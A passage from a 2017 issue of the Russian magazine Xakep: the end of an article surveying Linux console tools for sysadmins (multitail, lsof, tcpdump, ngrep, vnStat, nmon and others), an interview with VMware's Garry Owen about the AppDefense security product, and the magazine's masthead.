нить интервал перезапуска команды, а с помощью флага ‐d заставить watch
под свечивать изме нения в выводе.


MULTITAIL
Еще одна команда из конфига tmuxinator, о которой стоит упомянуть, —
это sudo tail ‐f /var/log/vsftpd.log. Эта команда выводит последние
десять строк лога vsftpd и ждет появ ления новых. Любой админ должен быть
зна ком с tail, а также ее ана логом в дистри бутивах, основанных на systemd:


$ journalctl ‐f ‐u vsftpd

Это такое же базовое зна ние, как умение переходить по каталогам. Но есть
у  tail более инте ресная альтернатива под наз вани ем MultiTail. Фактически
это тот же tail, но в мно гоокон ном варианте. Он поз воля ет выводить сра зу
несколько логов, разделяя экран по горизон тали:


$ sudo multitail /var/log/vsftpd.log /var/log/nginx/access.log

С systemd и его journald все опять же слож нее:


$ multitail ‐l "journalctl ‐f ‐u vsftpd" ‐l "journalctl ‐f ‐u nginx"

Даже еще сложнее:


$ multitail ‐l "journalctl ‐f ‐u vsftpd | tr ‐cd '[:space:][:print:]
'" ‐l "journalctl ‐f ‐u nginx | tr ‐cd '[:space:][:print:]' "

Такой изврат нужен, что бы удалить из логов специальные сим волы, которые
systemd использует для подсветки строк.





MULTISSH
Вернемся к SSH. Порой одну и ту же коман ду приходится выполнять на нес‐
кольких машинах. Это мож но сделать в том числе с помощью стандартных
воз можностей шелла:


for host in 192.168.0.1 192.168.0.2; do
    ssh $host "uname ‐a"
done

Либо воспользоваться специальным инс трументом, например mssh:


$ gem install mssh
$ mssh ‐‐hostlist 127.0.0.1,127.0.0.2 "uname ‐a


LSOF
Еще один очень важный инстру мент любого сисадмина — lsof (LiSt Open
Files). Эта утилита поз воляет выяснить, какой про цесс/приложение открыл те
или иные фай лы. Запущенная без аргумен тов, она выводит список всех
откры тых фай лов и про цессов. С помощью флагов этот список можно сде‐
лать более конкрет ным. Нап ример, узнать, какие про цес сы используют фай‐
лы указанного катало га:


$ sudo lsof +D /var/log/

Такая воз можность может очень пригодиться, ког да пытаешь ся размонти‐
ровать файловую систему, но получаешь ошибку Device or Resource Busy.
В этом случае достаточно убить процес сы, открыв шие файлы в ука занной
ФС, и ты сможешь размонтировать ее без всяких проб лем. Применив флаг ‐
t, сде лать это мож но в один проход:


# kill ‐9 `lsof ‐t +D /home`
# umount /home

Вывод так же можно профиль тро вать, используя имя нужного при ложе ния
или юзера. Например, сле дующая команда покажет все фай лы, откры тые
про цессами, чьи име на начинаются на ssh:


$ lsof ‐c ssh

А такая покажет все файлы, откры тые юзе ром vasya:


$ lsof ‐u vasya

Lsof так же можно исполь зовать для листинга всех сетевых подклю чений:


$ lsof ‐i4

Листинг можно ограничить определенным пор том:


$ lsof ‐i4 :80

Или получить список всех открытых портов:


$ lsof ‐iTCP ‐sTCP:LISTEN





TCPDUMP
Любому админу приходится решать проб лемы работы  сетевых  служб.
И порой в этом деле не обойтись без сниф фера, который наглядно покажет,
как протека ет обмен дан ными и что в этом процессе может идти не так. Эта‐
лоном среди снифферов для Linux считает ся Wireshark, но на этом выбор
не заканчивается. Прак тически любой дистрибутив Linux по умолчанию вклю‐
чает в себя консольный сниф фер tcpdump, с помощью которого можно быс‐
тро разобраться в ситуации.
  Запущенный без аргументов tcpdump без лишних слов начина ет выводить
в кон соль список всех пакетов, отправленных и при нятых на всех интерфей‐
сах машины. С помощью опции ‐i мож но выбрать нуж ный интерфейс:


$ sudo tcpdump ‐i wlp3s0

Что бы ограничить область дей ствия tcpdump толь ко конкретной машиной
и пор том, можно использовать такую конс трук цию:


$ sudo tcpdump ‐i wlp3s0 host 192.168.31.1 and port 53

Также можно заставить tcpdump выводить не толь ко информацию о пакетах,
но и их содер жимое:


$ sudo tcpdump ‐i wlp3s0 ‐X host 192.168.0.1 and port 80

Ес ли применяется шифрование, в этом нет никако го смысла, но с помощью
tcpdump можно анализи ровать данные, передаваемые с использованием
про токо лов HTTP и SMTP.
  Еще одно интересное умение tcpdump — фильтра ция пакетов по содер‐
жанию кон крет ных битов или бай тов в заголов ках протоколов. Для это го
используется такой формат: proto[expr:size], где proto — протокол, expr —
сме щение в байтах от начала заголовка пакета, а size — необязатель ное
поле,  указывающее  на  дли ну  рас сматрива емых  данных  (по  умол‐
чанию 1 байт). Например, что бы отфиль тро вать только пакеты с установ‐
ленным флагом SYN (инициация TCP‐рукопожатия), следует исполь зовать
такую запись:


$ sudo tcpdump 'tcp[13]==2'

Формат отче тов tcpdump — это стандарт, его понима ют практичес ки все сов‐
ременные сниф феры. Поэтому tcpdump мож но исполь зовать для генера ции
дампа на удаленной машине, а затем отправить его на локальную и провести
ана лиз с помощью того же Wireshark:


$ ssh root@example.ru tcpdump ‐w ‐ 'port !22' | wireshark ‐k ‐i ‐





NGREP
Tcpdump хорош своей уни версальностью и разнообрази ем возможностей,
однако для поиска конкретных данных внутри передаваемых пакетов его
использовать не так прос то и удоб но. С этой задачей гораздо лучше справ‐
ляет ся ngrep, пред назначен ный для отоб ражения сетевых пакетов, удов‐
летво ряющих заданной маске.
  Нап ример, чтобы най ти параметры, передаваемые методами GET и POST
в рамках HTTP‐сессии, мож но использовать следующую команду:


$ sudo ngrep ‐l ‐q ‐d eth0 "^GET |^POST " tcp and port 80

А так можно проана лизи ровать SMTP‐тра фик на всех сетевых интерфейсах:


$ sudo ngrep ‐i 'rcpt to|mail from' tcp port smtp


VNSTAT
Систем учета тра фика и накопления ста тистики сущес твует огромное мно‐
жество. Нередко они встро ены прямо в систему удаленного управле ния сер‐
вером и поз воля ют проана лизи ровать расходы с помощью наглядных гра‐
фиков. Но если ты используешь консоль и все, что тебе нужно, — это быстро
узнать статистику по интерфейсам, то лучший инстру мент — это vnStat.
   VnStat умеет накапливать статистику в непрерыв ном режиме, сохраняя
данные между  перезаг рузками,  а  использовать  его  про ще  простого.
Для начала установи пакет и запусти сервис vnstat:


$ sudo systemctl start vnstat
$ sudo vnstat ‐u

С это го момента он начнет сбор статистики. Для ее прос мотра дос таточно
выполнить  такую  команду  (wlp3s0  замени  именем  нуж ного  сетевого
интерфейса):


$ vnstat ‐i wlp3s0

Статистику мож но конкре тизировать, например вывес ти почасовую статис‐
тику с графиком:


$ vnstat ‐h wlp3s0

Статистику по дням или месяцам:


$ vnstat ‐d wlp3s0
$ vnstat ‐m wlp3s0

Ис поль зуя флаг ‐t, можно получить информацию о десяти днях с самым
боль шим рас ходом трафика:


$ vnstat ‐t wlp3s0

Что бы прос ледить за текущей активностью на сетевом интерфей се, vnStat
можно запус тить в live‐режиме:


$ vnstat ‐l ‐i wlp3s0

В этом случае он будет показы вать скорость передачи данных в текущий
момент, а после завершения работы выведет ста тистику за все время live‐
мониторинга.





IPTRAF-NG
Iptraf‐ng — еще один удобный инстру мент монито ринга сетевых интерфей‐
сов. Как и vnStat, он позволяет получить детальную ста тистику по исполь‐
зованию канала, но наибо лее полез ная фун кция — реалтайм‐мониторинг
трафика.
    Iptraf в наглядной форме показывает, с какими хостами идет обмен дан‐
ными в текущий момент, количество передан ных пакетов и их объем, а также
фла ги и ICMP‐сообщения. Для получения дос тупа к этой информации следует
выбрать пункт меню IP traﬃc monitor на главном экра не.





NETHOGS
VnStat и  iptraf удобны, когда дело каса ется получения данных для всего
интерфейса в целом. Но что, если тебе нужно узнать, какие конкретно при‐
ложения в текущий момент обмениваются дан ными с удаленными хостами?
В этом поможет ути лита NetHogs. Это своего рода ана лог утилиты top/htop
для монито ринга сети. Ты устанавлива ешь утилиту, а потом запус каешь ее,
указав нужный сетевой интерфейс:


$ sudo nethogs wlp3s0

На экра не появ ляется спи сок при ложений, наиболее часто обме нивающих ся
данными с удаленными машина ми.


IOTOP
Раз уж мы загово рили об ана логах top, то нельзя не упо мянуть iotop. Эта ути‐
лита поз воля ет увидеть, какие про цессы выпол няют операции записи/чтения
диска. Запускать ее лучше с флагом ‐‐only, иначе, кроме тех процессов, что
выполняют ввод/вывод в данный момент, она так же покажет часть других про‐
цессов, которые могут спать:


$ sudo iotop ‐‐only





NMON
Пришло время собрать все вместе. Nmon объединяет воз можности мно гих
рас смот ренных утилит и позволяет в реальном времени получать ста тистику
использования процессора, памяти, вво да/вывода, работы ядра и другие
данные.
  Nmon — консоль ное приложение с псевдогра фичес ким интерфейсом.
Работа ет оно так: ты запускаешь nmon с пра вами root, а затем добавляешь
на экран нужную тебе информацию. Например, что бы добавить на экран све‐
дения о загруженности процессора, следует нажать c, заполненность опе‐
ратив ной памяти — m, ввод/вывод — d, сеть — n, процессы — t, фай ловые
системы —  j. Так можно создать собс твенную конфигурацию монитора,
который будет отображать только то, что нуж но тебе.





В этой статье я пос тарался обойти стороной инс трументы, которые уже дол‐
жны быть тебе известны. Но если ты все‐таки о них не знаешь — вот краткий
спи сок того, что может при годиться:
 • top/htop — монитор про цессов, показывает тех, кто боль ше все го гру зит
   процессор;
 • scp — ути лита копирования файлов с удален ной машины и на нее по SSH;
 • nmap — сканер портов, позволяет провес ти быстрый поверхностный пен‐
   тест (о нем у нас уже была под робная статья);
 • netcat — сетевой швейцарский нож, поз воляет в том числе вруч ную под‐
   клю чать ся к серверам, работающим с plain text про токолами: HTTP, SMTP;
 • dd — утилита для блочного копирования данных, с нее можно снять дамп
  ФС;
 • mc — консоль ный двухпанель ный файловый менеджер.





ВМЕСТО ЗАКЛЮЧЕНИЯ
Здесь сле довало бы в очеред ной раз ска зать о том, что это толь ко верхушка
айсберга, что у каждого админа свои инс тру менты, обязательно приплести
гибкость Linux и так далее и тому подобное. Но эта статья все го лишь опи‐
сывает набор хороших инс тру ментов, которые сделают твою жизнь проще.
SYNACK





                                       Андрей Письменный
                                               Шеф‐редактор
                                               apismenny@gmail.com





                 ГЭРРИ ОУЭН
      О ТОМ, КАК VMWARE ИЗМЕНИТ ПОДХОД
         К КОРПОРАТИВНОЙ БЕЗОПАСНОСТИ





Лан дшафт решений для корпоративной безопасности ста‐
новится все слож нее, и мно гие компании спешат пред‐
ложить свои способы интеграции. В VMware, в частности,
работают над тем, что бы унифици ровать под ход к защите
приложе ний, которые выполняют ся в виртуализации. Мы
побеседовали со  старшим менеджером VMware,  чтобы
узнать  подробности  о  новом  про дук те  ком пании —
AppDefense.




Каж дый год ком пания VMware про водит конференцию VMworld, на которой
собирает пар тне ров и прес су, что бы рас сказать о новых достижениях. Аме‐
риканский VMworld проходит в Лас‐Вегасе, евро пейский — в Бар селоне,
его‐то нам и довелось посетить.





Хоть виртуализация обыч но не очень зрелищная вещь, в VMware таки при‐
думали, как развлечь пуб лику. Кей ноут начался с демонс трации штуки
под названи ем VMware VR  Datacenter  Experience. Это альтер нативный
интерфейс к панели vCenter, который работает в виртуальной реальности.
Нуж но переместить виртуалку со своего сервера в Amazon? Просто берешь
ее и швы ряешь в облако!





Быть может, это не самый практичный интерфейс на све те, но ничего ближе
к тому, как работу хакеров изоб ражали в фан тастике девянос тых, нам пока
видеть не приходилось. Исходники VR  Datacenter  Experience написаны
на Python и лежат на GitHub в откры том дос тупе. Судя по наличию свежих ком‐
митов, дело не кончилось раз влекухой на конферен ции, работа идет.
  Из серьезных же вещей для нас, конечно, интереснее всего были анонсы,
связанные с безопасностью, а их год от года ста новится все больше. К при‐
меру, в этом году в VMware объявили спецификации про токола HCX, который
обеспечивает защищенный канал для миг рации вир туальных машин между
вычислительными центрами (как частными, так и публичны ми).
  Другой важ ный анонс был пос вящен новому продук ту — AppDefense.
Ранее он был известен под псев донимом Project Goldilocks — это, кстати,
намек на астрономичес кий тер мин, обозначающий обитаемую зону звезды,
а не на сказоч ного пер сонажа. AppDefense как бы приз ван создать такую
безопасную зону для при ложений.
   Если вкратце, то смысл AppDefense в том, что эта технология позволяет
описывать манифесты для виртуальных машин и ука зывать, какие действия
характерны для конкретной ВМ, а также какие меры нужно предпринять, если
эти правила вдруг нарушаются.





                   Админская панель AppDefense

Гипервизор vSphere следит за ядром, запущенными про цессами и ком‐
муникациями гос тевой операционной системы и сверяет все происходящее
с манифестом. Если AppDefense обнаружит подозрительную активность, то
сра ботают заранее заданные контрмеры. Все работает через откры тый API,
который смо гут исполь зовать разработ чики. Это, например, поз волит под‐
ключить к делу анти вирус или иное средс тво выявления угроз.
  Подробнее об AppDefense и о том, как в VMware подходят к вопросам
безопасности, нам рассказал Гэр ри Оуэн, старший менед жер по продуктам
для конечных поль зователей в регионе EMEA.





                            Гэрри Оуэн

Я работаю в VMware без малого семь лет. Безопасность ста ла
для меня основным нап равлением только последние полгода, а до этого
работал в R&D. Занимался реализацией и выводом на рынок виртуального
рабочего окружения и решений, связанных с mobility management.
  До VMware я работал в Lenovo, Dell, Fujitsu Siemens и Sun —
отве чал за менед жмент продуктовых лине ек серверов и опе рационных сис‐
тем. А вообще я в этой индус трии с 1984 года. Начинал как программист,
в кол ледже изучал COBOL — кажет ся, этот факт выдает, что я немолод!
Потом я мно го писал на C и перешел на Unix — Linux тогда еще не было.
  После двад цати с чем‑то лет работы с железом я почувство-
вал, что пора что‑то менять. Индустрия сильно изменилась, серверы
x86 стали дешевы ми, маржа сузилась, и сейчас, чтобы выжить, нуж но про‐
давать очень мно го. Не сказать, что это плохо, но, чтобы иметь пространство
для креатива в маркетинге, маржа должна быть побольше. Это привело меня
к софту.
  Основа биз неса VMware — это виртуализация. Говорят даже, что
VMware изобрела виртуали зацию, но это, конечно, преувеличение. VMware
изобрела вир туализацию как бизнес на серверах x86, которые продаются
в боль ших количествах.
  Когда я езжу на кон ферен ции по безопасности, все под ходят
к нашему стен ду и спрашивают: «Зачем VMware здесь? Вы
не безопасники». И это правда. Нас нельзя назвать ком пани ей, спе‐
циализирующей ся на безопасности. Мы не занима емся мониторингом угроз
и не пишем анти вирусы.
  Большинство ИБ‑компаний про дол жают работать над безопас-
ностью в рамках модели, которой уже 35 лет. Мы же хотим перевер‐
нуть эту модель, точно так же, как мы произвели революцию с vSphere, поз‐
волив виртуали зировать вооб ще всё.
  Главная тема в ИБ — это по‑преж нему обеспечение безопас-
ности периметра сети. Вся работа сво дится к строительству этой стены
на периметре: шире и выше до бесконечности. В слу чае со многими угро‐
зами это при емлемо, но проб лема в том, что если злоумышленник пре одолел
этот периметр, то его уже ничто не остановит.
  Причина, по которой модель с периметром безопасности уста-
рела, не в том, что она пло ха, это была хорошая модель, она прекрасно
работа ла еще со времен мей нфреймов. Проб лема в том, что все изме‐
нилось. Периметр эффекти вен, ког да окру жение стабильно: системы одни
и те же, при ложения находятся в дата‐центре, все пользователи работают
из одно го здания и так далее.
  Мир меняется, и из‑за мобильных устройств теперь невоз-
можно четко очертить периметр. Многие сот рудники теперь находятся
за пре делами файрвола. Или при носят свои компь юте ры на работу. И все
это совершенно необ ходимо, это дает допол нитель ную гибкость, поз воля ет
дви гаться быстрее, луч ше конкурировать.
  Старая модель больше не работает. Вмес то того чтобы опираться
на большие стены вок руг сети, мы должны интегри ровать безопасность везде
внутри периметра. Ключ к это му — это фича нашего продукта NSX (он отве‐
чает за вир туали зацию сети), которая называется «микросегментация».
  NSX делает для сетей то же, что vSphere делает для вычис-
лений. Он виртуализирует сеть — берет физическую и строит то же в вир‐
туализации. Микросег ментация позволяет делить ее на меньшие эле менты
нас только гранулярно, нас колько нам нужно, — вплоть до отдельных при‐
ложений. Каж дая из микросетей может иметь свои элементы безопас ности.
То есть вместо того, что бы полагаться на защиту периметра, мы создаем
файрвол вокруг каждого приложения или груп пы приложе ний. Одно из пре‐
имуществ это го под хода в том, что приложение можно переместить в дру гой
дата‐центр или в облако, но полити ки безопас ности переместятся вмес те
с ним.
  Се год ня на рын ке тысячи про дук тов, у каж дого из них свой
администраторский интерфейс, и они не работают друг с дру гом
как положе но. Это постепенно  ста новит ся все большей проблемой
для корпоратив ной безопас ности. Каж дая компания пыта ется сражаться
с угрозами при помощи своего маленького про дукта — со своим интерфей‐
сом и со сво им API. Сейчас мно гообразие уже дос тигло точки, когда с ним
невозможно справить ся.
  Мы решили, что луч ший спо соб обеспечить безопасность —
это найти место в сети, которое будет затрагивать все: приложе-
ния, сервисы, мик росервисы, кон тейнеры. Если существу ет такой
слой, который взаимодейству ет со всем, то нужно добавить безопасность
в него, и тогда мы автомати чес ки защитим всю сеть. Оче видное мес то —
это гипервизор, vSphere. NSX уже работает вмес те с vSphere, и AppDefense
тоже встраивается в слой гипер визора.
  AppDefense — это новый про дукт, который мы представили совсем
недавно — на конферен ции в Лас‐Вегасе. Он предлага ет новый способ
защитить приложения, которые существуют в вир туализированном окру‐
жении.
  Старая модель всегда будет нагонять угро зу вместо того, что-
бы опе режать. Боль шинс тво нап равлен ных на борьбу с малварью продук‐
тов тех же Symantec или McAfee (мы с ними тес но сотрудни чаем) опирается
на такую схему: кто‐то где‐то заража ется, сооб щает об этом, а разработчики
создают решение на основе распознавания сигнатуры. Проблема в том, что
это работа ет, только если ты уже заранее знаешь, как выглядит угроза.
  К тому вре мени, как появится решение, мал варь уже рас-
пространится. В Великобритании Национальная служ ба здравоохранения
именно так понесла ущерб из‐за WannaCry, а в Америке перестал работать
DHL. Кажется, в Рос сии тоже пострадало какое‐то большое агентство.
  AppDefense под ходит к безопасности в виртуализиро ван ных
приложе ниях по‑дру гому. Вместо того чтобы идентифицировать плохое
поведе ние, он убеждается в хорошем. То есть, дру гими словами, для опре‐
деленного приложе ния или определен ной виртуальной машины мы можем
задать, как выг лядит ее поведение, если она не заражена. Мы можем сказать,
«что такое хорошо».
  На слу чай, если воз никнут откло нения, AppDefense поз воляет
про писать соответству ющие меры. Нап ример, поместить приложение
в кон тролируемое окру жение, или оста новить виртуальную машину, или изо‐
лировать виртуальную машину. И все это будет про исходить автоматически.
  При этом мы оставляем место и для дру гих вен доров, но они
будут работать в рамках новой модели. Сейчас наши клиенты жалу‐
ются, что тонут в мно гообразии угроз и решений. С подходом VMware все
дела ется один раз и из одной консоли управле ния. То есть вместо того, что‐
бы пытаться затыкать 25 раз ных дыр, мы чиним всё единожды через гипер‐
визор при помощи единого API. Но при этом API открыт, и каждый может
дополнить сво им решением vSphere, NSX и AppDefense.
  Мы не единствен ная компания, которая смотрит в эту сто рону,
но если говорить про виртуальное окру жение — мы уверены, что наше
решение луч шее.
   №10 (224)
             Илья Русанен          Алексей Глаз ков       Андрей Письменный
              Главный редактор       Выпускающий редактор         Шеф‐редактор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Письмен ный      Антон «ant» Жуков        Алек сандр «Dr.»
         PC ZONE, СЦЕ НА, UNITS         ВЗЛОМ               Лозовский
               pismenny@glc.ru              zhukov@glc.ru          MALWARE, КОДИНГ
                                                                           lozovsky@glc.ru
           Юрий Гольцев          Евгений Зоб нин          Илья Русанен
              ВЗЛОМ                 X‐MOBILE               КОДИНГ
                  goltsev@glc.ru               zobnin@glc.ru               rusanen@glc.ru
                                Павел Круглов
                                      UNIXOID и SYN/ACK
                                               kruglov@glc.ru


                          MEGANEWS
                           Мария Нефёдо ва
                                     nefedova.maria@gameland.ru


                                  АРТ
                                    Алик Вай нер
                                         Обложка


                               РЕК ЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАС ПРОСТРАНЕНИЕ И ПОДПИСКА

                                Наталья Але хина
                                   От дел распространения
                                                lapina@glc.ru

                         Под робная информация по подписке: info@glc.ru
                           Ад рес для писем: Москва, 109147, а/я 50





В случае возникно вения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Мос ква, ул. Ленинская Слобода, д.19, Омега пла‐
за. Издатель: ООО «Эрсиа»: 606400, Нижегород ская обл., Балахнинский р‐н, г. Балахна, Совет ская пл., д. 13. Учредитель: ООО «Принтер Эди‐
шионс», 614111, Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информа‐
ционных тех нологий и массовых ком муникаций (Роскомнад зоре), свидетель ство ПИ № ФС77‐56756 от 29.01.2014 года. Мнение редакции
не обязатель но сов пада ет с мнением авторов. Все материалы в номере предоставля ются как информа ция к размышлению. Лица, исполь‐
зующие дан ную информацию в противозаконных целях, могут быть прив лечены к ответственности. Редак ция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2017